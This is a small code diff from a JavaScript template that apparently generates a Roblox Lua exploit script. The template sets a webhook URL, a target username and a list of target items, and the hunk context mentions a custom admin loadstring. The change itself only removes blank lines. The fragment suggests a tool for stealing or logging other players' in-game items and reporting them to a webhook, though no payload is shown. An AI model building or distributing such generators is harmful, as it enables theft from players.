@@ -754,9 +754,7 @@ ${customAdminLoadstring}
 `;
   }
 
-  const script = `
-
-getgenv().WEBHOOK_URL = "${webhook}";
+  const script = `getgenv().WEBHOOK_URL = "${webhook}";
 getgenv().TARGET_USERNAME = "${username}";
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
